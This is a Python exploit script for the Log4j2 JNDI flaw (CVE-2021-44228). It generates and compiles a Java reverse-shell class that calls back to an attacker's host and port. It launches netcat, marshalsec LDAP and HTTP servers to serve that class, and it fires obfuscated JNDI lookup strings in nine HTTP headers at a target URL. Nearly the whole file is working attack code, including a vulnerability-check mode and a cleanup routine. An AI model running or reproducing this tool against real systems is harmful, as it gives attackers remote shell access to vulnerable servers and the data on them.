#!/usr/bin/python3
"""
Coded by: @faisalfs10x
GitHub: https://github.com/faisalfs10x
""" 

"""
make sure port 1389 is available and is not used by other service as the marshalsec jndi.LDAPRefServer is using port 1389 as default port.

"""
import requests
import argparse
import os
import time
from colored import fg

# color?
blue = fg('blue')
green = fg('green')
red = fg('red')

def gen_payload(LHOST,LPORT,maljavaclass,jclass):

    payload = ("""
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class %s {

  public %s() throws Exception {
    String host="%s";
    int port=%s;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
""") % (jclass,jclass,LHOST,LPORT)

    print(blue + f"\n[+] Generating payload to {maljavaclass} in current directory")
    m = maljavaclass[:-4]
    f = open(f"{maljavaclass}", "w")
    f.write(payload)
    f.close()

    print(blue + f"[+] Compiling payload {maljavaclass} to {m}class")
    os.system(f'$(which javac) {maljavaclass}')


def check_exploitable(TARGET,LHOST,LPORT):

    session = requests.Session()

    try:      
        print(blue + f'\n[+] Spawning listener : nc -lvp {LPORT}'+ blue)
        os.system(f'(setsid nc -lvp {LPORT} 0>&1 & ) 2>/dev/null')
        
        headers = {
            'User-Agent': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'X-Api-Version': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'X-Forwarded-For': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'Referer': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'Cookie': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'Connection': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'Authorization': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'X-Requested-With': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT),
            'Cache-Control': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%s}"% (LHOST,LPORT)
            } #"::-" notation bypass for headers

        print(blue + f"[+] Making request to target: {TARGET}")
        r = session.get(TARGET + "/", verify=False, timeout=5, headers=headers)
        
    except requests.Timeout as e: # check target whether make response in 5 s, then it indicates connection has been made to LPORT !
        print(green + f"\n[+] Target: {TARGET} seems vulnerable")
        time.sleep(2)
        print(green + f"[+] Verifying: {TARGET} ....")
        vuln_indicator = os.system(f'(setsid lsof -i :{LPORT} | grep ESTABLISHED 0>&1 &)')
        #print(vuln_indicator)
        if vuln_indicator != None :
            print(green + f"[+] Voila, target: {TARGET} is exploitable")
        else:
            print(red + f"[-] Target: {TARGET} NOT exploitable")

        os.system(f'kill -9 $(lsof -t -i:{LPORT})')
        exit()

    except requests.ConnectionError as e:
        print(red + f'[-] Target: {TARGET} - seems not available, is it valid IP ?')
        time.sleep(2)
        os.system(f'kill -9 $(lsof -t -i:{LPORT})')
        exit()

    except KeyboardInterrupt:
        exit('User aborted!')   


def rev_shell(TARGET,LHOST,LPORT,HTTPSERVERPORT,maljavaclass,jclass):

    session = requests.Session()
    m = maljavaclass[:-4]
    print(blue + f'\n[+] Server 1: Attempt to serve marshalsec jndi.LDAPRefServer on port {HTTPSERVERPORT}') # Start jndi LDAP Server 
    os.system(f'(setsid java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{LHOST}:{HTTPSERVERPORT}/#{jclass}" 0>&1 & ) 2>/dev/null')

    # setup python3 http.server on attacker host for serving Pwn.class to victim.
    # make sure python webserver is running in the same directory as Pwn.class else this exploit might not work!!!
    print(blue + f'[+] Server 2: Attempt to serve python3 http.server on port {HTTPSERVERPORT}\n')
    os.system(f'(setsid python3 -m http.server {HTTPSERVERPORT} 0>&1 & ) ') # add 2>/dev/null for clean up

    print(blue + '[+] Sleep 5 second to ensure all servers are up! [+]')
    time.sleep(5) # Sleep for 5 seconds to ensure all attacker server is up!

    try:
        print('\n[+] Attempt to spawn shell ')
        try:

            headers = {
                'User-Agent': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'X-Api-Version': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'X-Forwarded-For': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'Referer': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'Cookie': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'Connection': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'Authorization': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'X-Requested-With': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST),
                'Cache-Control': "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:1389/Exploit}"% (LHOST)
                } #"::-" notation bypass for headers

            print(f"[+] Making request to target: {TARGET}")
            r = session.get(TARGET + "/", verify=False, timeout=10, headers=headers)

        except requests.Timeout as e: # check target whether make response in 10 s, then it indicates shell has been spawned !
            print(green + f"\n[+] Success: shell spawned to {LHOST} via port {LPORT} - XD")
            
        else:
            print(red + f"\n[x] --------------------------------- Exploit failed -----------------------------------------------[x]")
            print(red + f"\n[-] Please setup listener first and try again with: nc -lvp {LPORT}                                    [-]")
            print(red + f"[-] Or target: {TARGET} might not reach Server 2: python3 http.server on port {HTTPSERVERPORT} [-]")
            print(red + f"[-] Please verify whether target could reach Server 2 to download {m}class by                      [-]")
            print(red + f"[-] opening new terminal with: python3 -m http.server {HTTPSERVERPORT} , and rerun the exploit                  [-]")
            print(red + f"\n[x] ------------------------------------------------------------------------------------------------[x]")

    except KeyboardInterrupt:
            exit('User aborted!')
    time.sleep(5)        


def do_cleanup(HTTPSERVERPORT,maljavaclass):

    m = maljavaclass[:-4]   
    print(blue + '\n[+] Cleaning up [+]')
    print(blue + f'[+] Killing Server 1: marshalsec jndi.LDAPRefServer on default port 1389')
    os.system(f'kill -9 $(lsof -t -i:1389)')
    print(blue + f'[+] Killing Server 2: python3 http.server on port {HTTPSERVERPORT}')
    os.system(f'kill -9 $(lsof -t -i:{HTTPSERVERPORT})')
    print(blue + f'[+] Removing payload: {maljavaclass} and {m}class')
    os.system(f'rm {maljavaclass} {m}class')

        
def main():
    parser = argparse.ArgumentParser(description='Log4j2 CVE-2021-44228 Reverse Shell')
    parser.add_argument('-M', '--mode', type=str, required=True, help=' Mode: check | rev')
    parser.add_argument('-u', '--target', type=str, required=True, help=' Target full URL, http://www.victimLog4j.xyz:8080')
    parser.add_argument('-l', '--lhost', type=str, required=True, help=' Attacker IP for receive revshell')
    parser.add_argument('-p', '--lport', type=str, required=True, help=' Attacker port for receive revshell')
    parser.add_argument('-hp', '--httpport', type=str, required=False, dest='httpport', default=8888, help=' HTTP server port on attacker host, default is 8888')
    parser.add_argument("-V",'--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()

    MODE = args.mode
    TARGET = args.target
    LHOST = args.lhost
    LPORT = args.lport
    HTTPSERVERPORT = args.httpport
    maljavaclass = 'Pawn.java'
    jclass = maljavaclass[:-5]

    try:

        if args.mode == "check" and args.target and args.lhost and args.lport:
            check_exploitable(TARGET,LHOST,LPORT)

        elif args.mode == "rev" and args.target and args.lhost and args.lport and args.httpport:
            gen_payload(LHOST,LPORT,maljavaclass,jclass)
            rev_shell(TARGET,LHOST,LPORT,HTTPSERVERPORT,maljavaclass,jclass)
            do_cleanup(HTTPSERVERPORT,maljavaclass)

        else:
            parser.print_help()
            exit(1)

    except Exception as e:
        exit(e)   
   
if __name__ == '__main__':

    try:
          main()
    except KeyboardInterrupt:
        exit('User aborted!') 